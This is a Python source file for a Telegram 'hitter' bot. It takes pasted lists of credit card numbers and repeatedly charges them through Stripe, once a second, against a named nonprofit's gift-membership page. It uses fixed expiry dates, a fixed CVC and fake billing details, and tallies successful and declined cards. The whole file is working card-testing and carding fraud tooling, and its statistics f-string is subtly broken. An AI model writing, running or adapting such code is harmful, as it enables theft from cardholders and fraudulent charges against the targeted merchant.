import stripe
import time
import json
import logging
import random
from datetime import datetime
import sys
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Conversation states
WAITING_FOR_CARDS, WAITING_FOR_AMOUNT = range(2)

class TelegramStripeBot:
    def __init__(self, config_path='config.json'):
        self.load_config(config_path)
        self.setup_logging()
        self.stripe = stripe
        self.stripe.api_key = self.config['stripe_secret_key']
        self.transaction_count = 0
        self.success_count = 0
        self.decline_count = 0
        self.error_count = 0
        self.is_running = False
        self.cards = []
        self.amount = 1000  # Default amount
        
    def load_config(self, config_path):
        try:
            with open(config_path, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            print(f"Error: {config_path} not found!")
            sys.exit(1)
        except json.JSONDecodeError:
            print(f"Error: Invalid JSON in {config_path}")
            sys.exit(1)
            
    def setup_logging(self):
        logging.basicConfig(
            filename=self.config['log_file'],
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
    def process_payment(self):
        try:
            card = random.choice(self.cards)
            payment = self.stripe.PaymentIntent.create(
                amount=self.amount,
                currency='usd',
                payment_method_data={
                    'type': 'card',
                    'card': {
                        'number': card,
                        'exp_month': 12,
                        'exp_year': 2025,
                        'cvc': '314',
                        'billing_details': {
                            'name': 'Test User',
                            'email': 'test@example.com',
                            'address': {
                                'line1': '123 Test St',
                                'city': 'Test City',
                                'state': 'CO',
                                'postal_code': '12345',
                                'country': 'US'
                            },
                            'phone': '1234567890'
                        }
                    }
                },
                metadata={
                    'site': 'Great Old Broads',
                    'type': 'gift_membership'
                }
            )
            return payment.status, card
        except stripe.error.CardError as e:
            return f"declined: {e.error.message}", card
        except Exception as e:
            return f"error: {str(e)}", card
            
    def log_transaction(self, status, card):
        self.transaction_count += 1
        if "succeeded" in status:
            self.success_count += 1
        elif "declined" in status:
            self.decline_count += 1
        else:
            self.error_count += 1
            
        log_message = f"Transaction {self.transaction_count} - Card: {card[:6]}XXXXXX{card[-4:]} - Status: {status}"
        print(log_message)
        logging.info(log_message)
        return log_message
        
    def get_stats(self):
        stats = f"""
=== Current Statistics ===
Total Transactions: {self.transaction_count}
Successful: {self.success_count}
Declined: {self.decline_count}
Errors: {self.error_count}
Success Rate: {(self.success_count/self.transaction_count)*100:.2f if self.transaction_count > 0 else 0}%
=======================
"""
        return stats

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "Welcome to Great Old Broads Hitter Bot! 🚀\n\n"
            "Use /hit to start hitting\n"
            "Use /stop to stop hitting\n"
            "Use /stats to see current statistics\n"
            "Use /help to see all commands"
        )

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "Available commands:\n"
            "/hit - Start hitting (will ask for cards and amount)\n"
            "/stop - Stop hitting\n"
            "/stats - Show current statistics\n"
            "/help - Show this help message"
        )

    async def hit(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Please enter the credit cards (one per line):")
        return WAITING_FOR_CARDS

    async def cards_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.cards = [card.strip() for card in update.message.text.split('\n') if card.strip()]
        await update.message.reply_text("Please enter the amount in cents (e.g., 1000 for $10.00):")
        return WAITING_FOR_AMOUNT

    async def amount_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            self.amount = int(update.message.text)
            self.is_running = True
            await update.message.reply_text(
                f"Starting to hit Great Old Broads gift membership\n"
                f"Amount: ${self.amount/100:.2f}\n"
                f"Cards loaded: {len(self.cards)}"
            )
            context.job_queue.run_repeating(self.hit_job, interval=1)
            return ConversationHandler.END
        except ValueError:
            await update.message.reply_text("Please enter a valid number!")
            return WAITING_FOR_AMOUNT

    async def stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.is_running = False
        if 'job' in context.job_queue.jobs():
            context.job_queue.jobs()[0].schedule_removal()
        await update.message.reply_text("Stopping the hitter...")

    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(self.get_stats())

    async def hit_job(self, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_running:
            return
        
        status, card = self.process_payment()
        log_message = self.log_transaction(status, card)
        
        if self.transaction_count % 10 == 0:
            await context.bot.send_message(
                chat_id=context.job_queue.jobs()[0].chat_id,
                text=f"Progress Update:\n{log_message}\n{self.get_stats()}"
            )

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("Operation cancelled.")
        return ConversationHandler.END

def main():
    # Load configuration
    bot = TelegramStripeBot()
    
    # Create application
    application = Application.builder().token(bot.config['telegram_token']).build()
    
    # Add conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('hit', bot.hit)],
        states={
            WAITING_FOR_CARDS: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot.cards_received)],
            WAITING_FOR_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot.amount_received)],
        },
        fallbacks=[CommandHandler('cancel', bot.cancel)]
    )
    
    # Add handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('start', bot.start))
    application.add_handler(CommandHandler('help', bot.help))
    application.add_handler(CommandHandler('stop', bot.stop))
    application.add_handler(CommandHandler('stats', bot.stats))
    
    # Start the bot
    print("Starting Telegram bot...")
    application.run_polling()

if __name__ == "__main__":
    main() 